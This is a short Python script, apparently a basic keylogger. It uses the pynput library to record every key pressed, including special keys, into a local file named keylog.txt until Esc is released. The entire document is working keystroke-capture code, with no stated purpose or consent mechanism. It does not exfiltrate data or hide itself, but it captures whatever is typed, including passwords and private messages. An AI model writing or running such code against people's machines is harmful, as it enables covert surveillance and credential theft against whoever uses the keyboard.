from pynput import keyboard

log_file_path = "keylog.txt"

def on_press(key):
    try:
        with open(log_file_path, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(log_file_path, "a") as log_file:
                log_file.write(" ")
        elif key == keyboard.Key.enter:
            with open(log_file_path, "a") as log_file:
                log_file.write("\n")
        else:
            with open(log_file_path, "a") as log_file:
                log_file.write(f" [{key.name}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
